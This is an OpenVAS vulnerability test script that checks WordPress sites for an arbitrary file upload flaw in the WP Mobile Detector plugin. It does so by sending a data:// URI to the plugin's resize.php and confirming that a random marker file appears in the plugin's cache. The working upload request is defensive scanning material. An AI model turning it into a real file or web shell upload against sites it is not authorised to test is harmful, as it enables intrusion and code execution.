##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_wp_mob_det_plug_vuln.nasl 14117 2019-03-12 14:02:42Z cfischer $
#
# WordPress WP Mobile Detector Plugin 3.5 - Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer..at..greenbone.net>
# Tameem Eissa <tameem.eissa..at..greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.107012");
  script_tag(name:"cvss_base", value:"4.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:S/C:P/I:P/A:P");
  script_version("$Revision: 14117 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-12 15:02:42 +0100 (Tue, 12 Mar 2019) $");
  script_tag(name:"creation_date", value:"2016-06-14 10:42:39 +0100 (Tue, 14 Jun 2016)");
  script_tag(name:"qod_type", value:"remote_vul");
  script_name("WordPress WP Mobile Detector Plugin 3.5 - Arbitrary File Upload Vulnerability");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39891/");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"summary", value:"Remotely upload arbitrary files on Wordpress webserver when WP
  Mobile Detector Plugin is installed and enabled.");

  script_tag(name:"insight", value:"An installed and enabled WP Mobile Detector plugin in Wordpress
  blogs enable hackers to remotely upload files to Wordpress webserver.");

  script_tag(name:"impact", value:"Successful exploitation allows an attacker to load up whatever file
  he wants to the Wordpress server. This can result in arbitrary code execution within the context of the vulnerable application.");

  script_tag(name:"affected", value:"Wordpress WP Mobile detector plugin up to and including version 3.5");

  script_tag(name:"solution", value:"Update WP Mobile Detector Plugin to version 3.7.");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("url_func.inc");

if( ! wpPort = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:wpPort ) )
  exit( 0 );

vtstrings = get_vt_strings();
str = vtstrings["default_rand"];
data = base64( str:str );

ex = 'data://text/plain;base64,' + data;

ex_url = dir + 'wp-content/plugins/wp-mobile-detector/resize.php?src=' + urlencode ( str:ex );

check_url = dir + 'wp-content/plugins/wp-mobile-detector/cache/' + urlencode( str: 'plain;base64,' + data );

req = http_get( item:ex_url, port:wpPort );
buf = http_keepalive_send_recv( port:wpPort, data:req, bodyonly:FALSE );

if( buf =~ "^HTTP/1\.[01] 200" && "GIF89" >< buf )
{
  if( http_vuln_check( port:wpPort, url:check_url, pattern:str, check_header:TRUE) )
  {
    report = report_vuln_url( port:wpPort, url:ex_url );
    security_message( port:wpPort, data:report );
    exit( 0 );
  }
}

exit( 99 );